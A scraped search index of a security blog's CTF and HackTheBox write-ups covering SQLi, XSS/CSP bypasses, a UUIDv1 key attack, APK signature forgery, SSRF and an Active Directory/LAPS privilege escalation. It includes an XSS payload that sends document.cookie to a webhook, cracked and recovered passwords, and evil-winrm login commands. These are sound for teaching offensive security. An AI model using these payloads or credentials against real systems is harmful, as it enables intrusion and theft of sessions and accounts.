(req, res) =\u003e { const client = new MongoClient(process.env.MONGODB_URI); try { console.log(\"remote ip:\" + requestIp.getClientIp(req)); console.log(\"/users body \", req.body, typeof(req.body)); const userId = req.body.userId; if(typeof(req.body) === 'object' \u0026\u0026 userId \u0026\u0026 userId.match(uuidFormat)) { await client.connect(); const db = client.db(\"evenr2_2\"); const user = await db .collection(\"users\") .find({ user_id: userId }) .maxTimeMS(5000) .toArray() console.log(user); res.send(JSON.stringify(user)); } else { res.send(\"Invalid arguments provided\"); } } catch (e) { res.status(500).end(e.message); console.error(e); } finally { await client.close(); } }) app2.post('/getCompanies', async (req, res) =\u003e { const client = new MongoClient(process.env.MONGODB_URI); try { console.log(\"remote ip:\" + requestIp.getClientIp(req)); console.log(\"/companies body \", req.body, typeof(req.body)); ... }) app2.post('/CRMEntities', async (req, res) =\u003e { res.send(CRMEntities); })\radding the ? will make the endpoint still valid to request then we can add the arguments needed and get the record we want ","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:2:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"3- Hack the Menu (XSS) The challenge is a clear open redirect challenge to trigger XSS via the javascript scheme , however the scheme is blocked in all cases as shown import React from 'react'; import Image from 'next/image' const sanitizeLink = (directLink) =\u003e { // prevent XSS (replace case insensitive 'javascript' recursively in the URL) let searchMask = \"javascript\"; let regEx = new RegExp(searchMask, \"ig\"); while(directLink !== String(directLink).replace(regEx, '')) { directLink = String(directLink).replace(regEx, ''); } return directLink; }\rThere are multiple ways to solve it by adding characters that still make the protocol valid and passes the check like %09 , %0A%0D as shown ","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:3:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"4- Sensitive Flags (Nodejs UIDv1) The goal of the challenge is clear we want to issue a request to /flag with a valid username and a valid corresponding API_KEY , although it checks for authroization header we can still see the data at the redirect response (unsafe redirect) , and we can generate API_KEY for the admin account using createAPIKey const secretKey = crypto.randomBytes(64); const flags = { 'Belgium': 'black yellow red', 'United States': 'red white blue', 'France': 'blue white red', 'United Kingdom': 'red white blue', 'Germany': 'black red gold', 'FLAG': process.env.FLAG }; const users = {'admin': {'APIKey': uuid.v1()}}; app.get('/getAPIKey', (req, res) =\u003e { // Step 2: Only send the result if the user is logged in const authHeader = req.headers.authorization || \"No auth\"; const token = authHeader.split(' ')[1]; result = {'APIKey': ''} jwt.verify(token, secretKey, (err, user) =\u003e { if (err) { // If the token is not valid res.status(302); res.setHeader('Location', '/Forbidden'); } else { // If the token is valud result.APIKey = users[user.username]['APIKey']; } res.send(result); }); }); app.get('/createAPIKey', (req, res) =\u003e { if (req.query.sample) return res.json(uuid.v1()); if (!users[req.query.username]) return res.json('That user does not exist'); users[req.query.username]['APIKey'] = uuid.v1(); return res.json(`Generated new API key for user ${req.query.username}`); }); app.get('/flag', (req, res) =\u003e { // Step 1: Get the flag data but protected by the API key, our flag data is very sensitive! let result = 'No result yet' if (users[req.query.username] \u0026\u0026 req.query.apikey === users[req.query.username]['APIKey']) { result = flags[req.query.flag]; } // Step 2: Only send the result if the user is logged in const authHeader = req.headers.authorization || \"No auth\"; const token = authHeader.split(' ')[1]; jwt.verify(token, secretKey, (err) =\u003e { // If the token is not valid if (err) { res.status(302); res.setHeader(\"Location\", \"/Forbidden\") } // If the token is valid res.send(result) }); });\rUsing uuid.v1() is known to be unsecure as it calculates values based on the timestamp and mac address of the device , it is known to be vulnerable for the sandwich attack , the following lines are the most important ones , we can get the sample and right after it the admin API_KEY is set so we can get brute-force few ones after the sample we got to get the APIKey assigned to the admin if (req.query.sample) return res.json(uuid.v1()); if (!users[req.query.username]) return res.json('That user does not exist'); users[req.query.username]['APIKey'] = uuid.v1();\rRunning the sample request multiple times to check the pattern we get only the first fragment is slightly changed So eventually solution will be to do the following steps : reset admin api token get the sample value brute-force the first fragment (maybe last 6 digits of the first fragment is enough) However , there is another unintended solution to bypass the checks as following (This solution was discussed in the ctf server after the event ended) if (users[req.query.username] \u0026\u0026 req.query.apikey === users[req.query.username]['APIKey']) { result = flags[req.query.flag]; }\rAs we control the req.query.username , if we pass the first check so it returns something but doesn’t have an apikey In same time don’t provide apikey parameter so we pass the if checks and get into the body we supply ?flag=FLAG so we choose the flag from the list given Function.prototype.toString()\rReturns a string representing the source code of the function. Overrides the Object.prototype.toString method.\rTo abuse the req.query.username we can supply req.query.username[\"toString\"] This returns a function and not undefined error message so first check in the if is passed , then don’t provide apikey parameter so it will be undefined and as the username is not really valid will also return undefined from users[req.query.username]['APIKey'] and pass all checks. then supply flag parameter , final payload : /flag?us","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:4:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"6- Sign Here (React Native) This challenge was the most interesting one as it contains APK analysis part , analyzing the code we will understand the following to get the flag /flag we need to be logged in (have a valid session) we also need a valid signature which contains url , body parameters so we don’t manipulate it we can’t get admin password or secret key directly there is an apk we can use as a client to send requests const users = { 'admin': { id: 1, username: 'admin', password: process.env.ADMIN_PASSWORD, flag: process.env.FLAG }, 'user': { id: 2, username: 'user', password: 'password', flag: 'You don\\'t have a flag.' } }; function requireLogin(req, res, next) { if (req.session \u0026\u0026 req.session.user) { return next(); } else { return res.status(401).json({ message: 'Unauthorized' }); } } function verifySignature(secret) { return function(req, res, next) { const url = req.originalUrl; const body = req.body || {}; const signature = req.get('Signature'); if (!signature) return res.status(401).send('Signature header is missing'); const hmac = crypto.createHmac('sha256', secret); hmac.update(url); hmac.update(JSON.stringify(body)); const calculatedSignature = hmac.digest('hex'); if (signature !== calculatedSignature) return res.status(401).send('Invalid signature'); next(); }; } const verifySignatureMiddleware = verifySignature(process.env.SIGNING_SECRET) const app = express(); app.use(cors()); app.use(express.json()); app.use(session({secret: process.env.SESSION_SECRET, resave: false, saveUninitialized: true})); app.post('/login', verifySignatureMiddleware, (req, res) =\u003e { const { username, password } = req.body; const user = users[username]; if (user \u0026\u0026 user.password === password) { req.session.user = username; res.json({ message: 'Login successful', user: user }); } else { res.status(401).json({ message: 'Invalid username or password' }); } }); app.get('/flag', requireLogin, verifySignatureMiddleware, (req, res) =\u003e { const id = Number(req.query.id); res.json({ flag: Object.entries(users).find(([_, value]) =\u003e value.id === id)[1]['flag'] }); }); app.get('/download/SignHere.apk', (req, res) =\u003e { res.send('Download the app \u003ca href=https://sam-staging.wizer-ctf.com/downloads/SignHere.apk\u003ehere\u003c/a\u003e'); });\rDownloading the APK and starting it with jadx we found some strings related to facebook react and can find the assets/index.android.bundle file confirming it is react native application , the file is not readable as it is in bytecode format , decompressing the apk and running file against it we found the following index.android.bundle: Hermes JavaScript bytecode, version 96\rsearching for de-compilers for this version only found this one herhermes-dec which can decompile and dis-assemble the bundle file # install sudo pip3 install --upgrade git+https://github.com/P1sec/hermes-dec # run commands hbc-disassembler assets/index.android.bundle file.hasm hbc-decompiler assets/index.android.bundle file.js Running the apk to see where to search for what , also we will run proxydroid with burpsuite ip as a proxy to interecpt traffic and capture requests the application takes the url root and username , password after submitting request the below request is issues to /login with the signature the response returned is displayed in the app The signature is generated in the apk , so we can try to get to its logic and generate our signature to the /flag endpoint , as the apk appends /login by itself we can search for that string in the js file we generated by the decompiler , will find this long hex encoded string which can be decoded to Th!s1SAV3rrrrrrrrYYYYYYG00DS3cr3t! which will be the key now using following page we can re-produce same signature in the login request const crypto = require('crypto'); function generateSignature(secret, url, body) { const hmac = crypto.createHmac('sha256', secret); hmac.update(url); hmac.update(JSON.stringify(body)); return hmac.digest('hex'); } const secret = '54682173315341563372727272727272725959595959594","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:5:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Web Exploitation"],"content":"This Challenge is about exploiting cross site scripting with a strict CSP in place along with XSS Santizer and other restrictions , the interesting part in this blog is about learning the root cause and idenfiy exploit points. the challenge may seem very easy and it is easy and fun indeed. ","date":"2023-06-04","objectID":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/:0:0","tags":["CTF","XSS","CSP"],"title":"JustCTF Extra Safe Security Layers writeup","uri":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/"},{"categories":["Web Exploitation"],"content":"Source Code Review we are give the following files along with the Dockerfile â”‚ app.js\râ”‚ bot.js\râ”‚ flag.txt\râ”‚ package.json\râ”‚ tempCodeRunnerFile.js\râ”‚\râ”œâ”€â”€â”€public\râ”‚ admin_background.png\râ”‚ background.png\râ”‚\râ””â”€â”€â”€templates\rindex.ejs\rapp.js First we have some imports and rate limiter because the challenge has one public URL For all players. also admin cookie is a random UUID value.( UUID Example : d29217e9-d6b2-435e-99ef-84fb52c267cb) import express from \"express\"; import cookieParser from \"cookie-parser\"; import rateLimit from \"express-rate-limit\"; import { randomUUID } from \"crypto\"; import { xss } from \"express-xss-sanitizer\"; import { report } from \"./bot.js\"; // Rate limit for report endpoint - 1 request per minute const limiter = rateLimit({ windowMs: 60 * 1000, max: 1, standardHeaders: true, legacyHeaders: false, }); export const adminCookie = randomUUID();\rThen it uses the xss sanitizer on the middleware (against any input value before processing it) and from the package.json file we got the version is 1.1.6 which is the latest version (at this time) we also see some constants SHA-1 Hashed will be used latter in the CSP app.use(xss()); const css = \"sha256-vLdrwYlWaDndNN9sQ9ZZrxSq93n8/wam7RRrUaZPZuE=\"; const commonJs = \"sha256-hPqYpiz7JNIo+Pdm+2iyVcEpBmkLbYzZp4wT0VtRo/o=\"; const defaultJs = \"sha256-PxCHadKfAzMTySbSjFxfuhIk02Azy/H24W0/Yx2wL/8=\"; const adminJs = \"sha256-5TQWiNNpvAcBZlNow32O2rAcetDLEqM7rl+uvpcnTb8=\";\rthe default CSP seems to be very strict and properly configured as we can’t load external scripts other than if the SHA1 hash value matches the constants above and other same for other directives :( const defaultCSP = `default-src 'none'; img-src 'self'; style-src '${css}'; script-src '${commonJs}' '${defaultJs}'; connect-src 'self';`;\rand we have some blacklisted words const blacklist = [ \"fetch\", \"eval\", \"alert\", \"prompt\", \"confirm\", \"XMLHttpRequest\", \"request\", \"WebSocket\", \"EventSource\", ]; app.use(cookieParser()); app.use(express.json());\rand now let’s Jump to the juicy part , for any request the following security layers are applied First thing it makes sure the requested parameter does not include any of the blacklisted words app.use((req, res, next) =\u003e { if (req.query) { // Safety layer 2 const s = JSON.stringify(req.query).toLowerCase(); for (const b of blacklist) { if (s.includes(b.toLowerCase())) { return res.status(403).send(\"You are not allowed to do that.\"); } }\rnext make sure it is ASCII Printable (range 32 to 127) // Safety layer 3 for (const c of s) { if (c.charCodeAt(0) \u003e 127 || c.charCodeAt(0) \u003c 32) { return res.status(403).send(\"You are not allowed to do that.\"); } } }\rif there is an admin cookie equals to the UUID Value from above it will have some values for the res.user object as following , it sets the background for admin and the hash values are corresponding to admin constants. if (req.cookies?.admin === adminCookie) { // admin cookie res.user = { isAdmin: true, text: \"Welcome back :)\", unmodifiable: { background: \"admin_background.png\", CSP: `default-src 'self'; img-src 'self'; style-src '${css}'; script-src '${adminJs}' '${commonJs}';`, // no connect self CSP }, }; } if the user is not an admin (i.e doesnot have UUID Value as admin cookie) , the user will have the normal background and the variables set are assigned to the user. else { // Safety layer 4 res.user = { text: \"Hi! You can modify this text by visiting `?text=Hi`. But I must warn you... you can't have html tags in your text.\", unmodifiable: { background: \"background.png\", }, }; } if (req.query.text) { res.user = { ...res.user, ...req.query }; }\rit then checks if the request has the text parameter set , if so it will execute this line , the three dots operator can be used for concatenating source which makes this part very interesting. it concatenates all the values of the query to the res.user object. let’s keep that in mind res.user = { ...res.user, ...req.query }; from above snipper the normal us","date":"2023-06-04","objectID":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/:1:0","tags":["CTF","XSS","CSP"],"title":"JustCTF Extra Safe Security Layers writeup","uri":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/"},{"categories":["Web Exploitation"],"content":"Goal We are against typical xss challenge where a bot visits an application vulnerable to cross site scripting and when the bot opens the page along with parameters we supply , it will be triggered and we should get the flag cookie value. However we have some obstacles here : 1- The strict CSP we got assigned because we don’t have one in our user object 2- The XSS Sanitizer does not have bypasses we can use Bypassing CSP We can get around the first obstacle thanks to the vuln in the Safety layer 4 Code Snippet , because if we issue following request http://challenge.com/?text=test\u0026unmodifiable[background]=admin_background.png\rwe can see our input is reflected successfully indicating we can modify the object values ! ,as well as add new ones :D ? we will add a new CSP Value so that it will not assign as the default strict CSP Value , crafting the following CSP allows the browsers to load img source from external website (our webhook) and removes all other restrictions img-src 'self' https://webhook.site/xxxxxxx;\rSending the request http://xssl.web.jctf.pro/?text=a\u0026unmodifiable[CSP]=img-src%20%27self%27%20https://webhook.site/xxxxxxx;\rThe new CSP Value has been assigned indeed now we can think of allowing external scripts loading from our webhook but this will make us use \u003cscript src= at the text parameter which will not b executing due to the xss sanitizer. Bypassing XSS Sanitizer From the index.ejs we can see this snippet , it takes the value from the unmodifiable.background and assign it to the background with img tag. main.innerHTML += ` \u003cimg class='background' src='\u003c%- unmodifiable?.background %\u003e'\u003e`;\rwhat if add the value x' onerror=alert(1) will it be executed ? , well no but because of the blacklisted words and not because of the xss sanitizer we can trigger an xss but let’s try to find a payload without the blacklisted words , how can we send request without the XmlHttpRequest ,fetch . searching here will find the Beacon API which we can try http://xssl.web.jctf.pro/?text=a\u0026unmodifiable[CSP]=img-src 'self' https://webhook.site/xxxxx\u0026unmodifiable[background]=unmodifiable[background]=x' onerror=\"navigator.sendBeacon('https://webhook.site/xxxxxx/');\"\rand we got a call back in the webhook , and here is our payload in the page source Exploiting The Final Payload will do the following : set text parameter so we get under the merging condition set CSP Value so we do not get the restrict default one injecting onerror event in the img src tag which will be added via innerhtml onerror which will be triggered due to the invalid source will send a request to our hook along with the cookies the bot will parse all these parameters and visit the application with them along with the cookies (flag cookie) http://xssl.web.jctf.pro/?text=a\u0026unmodifiable[CSP]=img-src 'self' https://webhook.site/xxxxxxxxx;\u0026unmodifiable[background]=x' onerror=\"navigator.sendBeacon('https://webhook.site/xxxxxxxxx/?cookie='+encodeURIComponent(document.cookie));\"\r","date":"2023-06-04","objectID":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/:2:0","tags":["CTF","XSS","CSP"],"title":"JustCTF Extra Safe Security Layers writeup","uri":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/"},{"categories":["Linux Machines"],"content":"In This Box we are facing interesting Stuff like Docker , git hooks and other stuff. first we got access to a docker in the machine by overwritting the application code with a reverse shell. then we make port forwarding to scan the original host which has a Service running and we can see it from the docker. From this Service we can get access to the actual machine and from their we can get the root access using git hooks because the root seems to have a cronjob running git Scanning nmap -A -T5 10.129.168.8 -oN intial.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Sun, 22 May 2022 18:39:53 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | \u003chtml lang=\"en\"\u003e | \u003chead\u003e | \u003cmeta charset=\"UTF-8\"\u003e | \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e | \u003ctitle\u003eupcloud - Upload files for Free!\u003c/title\u003e | \u003cscript src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"\u003e\u003c/script\u003e | \u003cscript src=\"/static/vendor/popper/popper.min.js\"\u003e\u003c/script\u003e | \u003cscript src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"\u003e\u003c/script\u003e | \u003cscript src=\"/static/js/ie10-viewport-bug-workaround.js\"\u003e\u003c/script\u003e | \u003clink rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/\u003e | \u003clink rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/\u003e | \u003clink rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/\u003e | \u003clink rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Sun, 22 May 2022 18:39:53 GMT | Content-Type: text/html; charset=utf-8 | Allow: HEAD, GET, OPTIONS | Content-Length: 0 | Connection: close | RTSPRequest: | \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" | \"http://www.w3.org/TR/html4/strict.dtd\"\u003e | \u003chtml\u003e | \u003chead\u003e | \u003cmeta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"\u003e | \u003ctitle\u003eError response\u003c/title\u003e | \u003c/head\u003e | \u003cbody\u003e | \u003ch1\u003eError response\u003c/h1\u003e | \u003cp\u003eError code: 400\u003c/p\u003e | \u003cp\u003eMessage: Bad request version ('RTSP/1.0').\u003c/p\u003e | \u003cp\u003eError code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u003c/p\u003e | \u003c/body\u003e |_ \u003c/html\u003e |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 |_http-title: upcloud - Upload files for Free!\rEnumeration we are introduced with this page which doesn’t contain much information or user inputs viewing the page source will see there are 2 endpoints : /download /upcloud\rat /download we can download a file source.zip which contains some source codes related to the web page we are into now. There is Dockerfile which reveals the web page we have seen is built from a docker container , so if we get a remote code execution from this application we will be in the container itself It reveals also the application current working directory which is under /app , we know also it uses Flask views.py we can see from this code it has upload function which we find under /upcloud, and it will add the file to the path os.getcwd()/public/uploads/ import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route('/', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html') @app.route('/uploads/\u003cpath:path\u003e') def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))\rwe can also seeget_f","date":"2022-10-08","objectID":"/posts/linux-machines/2022-10-08-open-source/:0:0","tags":["Hackthebox","git","docker","port-forwarding"],"title":"Open Source HackTheBox Writeup","uri":"/posts/linux-machines/2022-10-08-open-source/"},{"categories":["Web Exploitation"],"content":"This challenge was in Blackhat CTF Qualifications 2022 and we have participated under the team 0xCha0s, we have managed to solve multiple challenges. this challenge was ranked medium for 250 pts . Enumeration We are introduced with this page , it takes the search engine (google,duckduckgo,search encrypt) and the Query we want testing the application functions we can try google engine with any word , and we can see the image rendered as follows The request is issued to /api/generate with the search engine name and the query Playing with the searchengine i noticed it adds .com at the end , so for example sending firefox returns firefox.com result now we can take a look at the source code which we can find at /source , we can focus on the flag part. .. ... @app.route(\"/flag\") def flag(): # TODO: Fix typo if request.remote_addr == \"127.0.0.1\" and request.url.startswith(\"http://l0calhost\"): return os.getenv(\"FLAG\"), 200 return \"Nice try\", 200 app.run(\"0.0.0.0\", 8080)\rIt will print the flag only if we visited the /flag from the localhost and the notice the requested url must start with http://l0calhost So basically there are a lot of Scenarios which we can take like registering subdomain start with l0calhost and stuff. but we can think of other solutions ;) Exploitation We want the application itself to visit the 127.0.0.1:8080/flag and the url should start with http://l0calhost to pass the check If we fire up ngrok http server and host index.html with the content: \u003chtml\u003e \u003cscript\u003e document.write(\"a\"); \u003c/script\u003e \u003c/html\u003e\rand at the search-engine we can use the ngrok url and add # at the end to comment the appended .com as we discussed before. and we can run javascript now we can try to redirect the application to visit 127.0.0.1:8080/flag with the document.location method document.location = \"http://127.0.0.1:8080/flag\";\rbut as expected it will not pass the check of request.url.startswith(\"http://l0calhost\"): so we need some how to make a url which start with the http://l0calhost and also redirect the application to the http://127.0.0.1:8080/flag. searching for such redirectors we can see This http://localtest.me ---\u003e 127.0.0.1\rSo the mentioned domain and all wildcards points to the 127.0.0.1 So if we craft the following url to be redirected to it document.location = \"http://l0calhost.localtest.me:8080/flag\";\rHosting the index.html in ngrok with the content \u003chtml\u003e \u003ch1\u003etest\u003c/h1\u003e \u003cscript\u003e document.location = \"http://l0calhost.localtest.me:8080/flag\"; \u003c/script\u003e \u003c/html\u003e\rSending the request as follows : Finally we get the Flag ! ","date":"2022-10-01","objectID":"/posts/web-exploitation/2022-10-01-meme-generator/:0:0","tags":["CTF","SSRF"],"title":"meme generator challenge writeup","uri":"/posts/web-exploitation/2022-10-01-meme-generator/"},{"categories":["Windows Machines"],"content":"In this Box we are against a windows machine has the active directory service installed on it , we can list files on smb shares and access some shared folder to find a backup.zip file which contains a pfx file for a user on the domain , we can also find some hints about LAPS. after extracting the key and certificate from the pfx file we can login using WinRM. then checking the powershell history we can see password for another user which is a memeber of the LAPS_READERS Group so the other user can read the administrator password in clear text ","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:0:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"Scanning nmap -Pn -A -T4 10.10.11.152 -oN nmap.intial\rOutput PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-20 21:08:49Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h59m58s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2022-08-20T21:09:00 |_ start_date: N/A\rwe can see this machine has the Active directory service installed on it because of the DNS service and the kpassword5 ports are open if we make a full port scan we will get : 5986/tcp open wsmans 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49696/tcp open unknown 52713/tcp open unknown\rport 5986 is open which is the WinRm port which we can use to login to the box using evil-winrm tool , so we maybe use it latter. ","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:1:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"Enumeration We can start Enumerating the smb service to check if we have access without providing passwords : smbclient -L 10.10.11.152 Enter WORKGROUP\\kali's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available\rwe can list the folders without any password , we can go check non defaults folders like Shares smbclient //10.10.11.152/Shares Enter WORKGROUP\\kali's password: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Mon Oct 25 11:39:15 2021 .. D 0 Mon Oct 25 11:39:15 2021 Dev D 0 Mon Oct 25 15:40:06 2021 HelpDesk D 0 Mon Oct 25 11:48:42 2021\rwe can download the files in both of these directories to check if there is anything helpful -rw-r--r-- 1 kali kali 102K Aug 20 09:16 LAPS_Datasheet.docx -rw-r--r-- 1 kali kali 627K Aug 20 09:16 LAPS_OperationsGuide.docx -rw-r--r-- 1 kali kali 71K Aug 20 09:16 LAPS_TechnicalSpecification.docx -rw-r--r-- 1 kali kali 1.1M Aug 20 09:16 LAPS.x64.msi -rw-r--r-- 1 kali kali 2.6K Aug 20 09:15 winrm_backup.zip\rFrom the files we have found we can assume the machine has LAPS (Local Administrator Password Solution) installed on it to protect administrator password. LAPS function is to set a different, random password for the common local administrator account on every computer in the domain and we have winrm_backup.zip which we can try to open but will find it is protected with a password , we can try crack it : fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u winrm_backup.zip PASSWORD FOUND!!!!: pw == supremelegacy\rBy Extracting the zip file we will get legacyy_dev_auth.pfx The . pfx file, which is in a PKCS#12 format,Â contains the SSL certificate (public keys) and the corresponding private keys Searching for it we will come across this page which explains how to get the key,cert from the pfx file. But there is a password required in the steps we can use crackpkcs12 tool to get the password we need crackpkcs12 legacyy_dev_auth.pfx -d /usr/share/wordlists/rockyou.txt Dictionary attack - Starting 8 threads ********************************************************* Dictionary attack - Thread 8 - Password found: thuglegacy *********************************************************\rnow we can extract the key and the certificate we want openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out leg.key openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out leg.crt\r","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:2:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"Foothold We can Authenticate to the box using the key and the cert we have generated from the pfx file . as the we have said before we can use evil-winrm to login so let’s try : evil-winrm -u legacy -c leg.crt -k leg.key -i 10.10.11.152 -S\rwe can upload Winpeas to see if there is any low hanging fruits first : *Evil-WinRM* PS C:\\Users\\legacyy\\Favorites\u003e upload winPEAS.bat\rand we can find under the PowerShell history C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit\rWe can see password E3R$Q62^12p7PLlC%KWaxuaV and the user svc_deploy ,we can try to login with that user: evil-winrm -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152 -S\r","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:3:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"Privilege escalation After logging in successfully with that user, we can think of the LAPs we have found earlier maybe it was there for a reason. Reading here we can check if it is installed using : Get-ChildItem 'C:\\Program Files\\LAPS\\CSE\\Admpwd.dll'\rand it is indeed installed , reading about LAPS Attributes we can see this , maybe the ms-Mcs-AdmPwd is misconfigured The Misconfiguration : Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'\rAnd we have access to the administrator password in clear text ! , we can try to login with the administrator password evil-winrm -u administrator -p '1M-btm[l8iH]K{[OigWn3zV%' -i 10.10.11.152 -S\rand we are in as administrator ","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:4:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"pwned","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:4:1","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Web Exploitation"],"content":" CTF name AWG 2022 challenge kenzy category web about SQL injection description captcha is not that secure points 900 team 0xCha0s ","date":"2022-08-06","objectID":"/posts/web-exploitation/2022-08-06-kenzy/:0:0","tags":["CTF","sql-injection"],"title":"kenzy challenge Writeup","uri":"/posts/web-exploitation/2022-08-06-kenzy/"},{"categories":["Web Exploitation"],"content":"Discovery we are introduced with this page which takes username ,password and the Captcha If we check the source code we can notice this comment \u003c!-- Username =====\u003e admin --\u003e\rwe can also find the endpoint which generates the captcha each time we request it different captcha is assigned http://34.175.249.72:60001/scripts/captcha.php\rLet’s check the application by submitting the admin as a username and any password with a valid captcha It returns an invalid username or password because we don’t really know the correct password and default credentials don’t work as we want to be able to login without password , we should think of SQL injection. trying a basic payload at the password we can see this result which is a great hint for SQLi , we should be in the correct path but this page doesn’t reveal much. Trying some payloads in the password filed wasn’t really helpful as when we tried admin' OR 1=1# it returns same response for 1=1 and 1=2 . so it doesn’t work really well. we can take a look at the username field. Trying username=admin' OR 1=1# we got this response {\"Username\":\"admin'1=1#\",\"status\":\"statement error\"}\rwe can see the OR is removed and the spaces as well ! , same thing with the AND -\u003e Bypass filters : The most famous bypass for the spaces filter is replacing it with /**/ , and we can try use OORR instead of OR so if OR is removed from OORR we got our 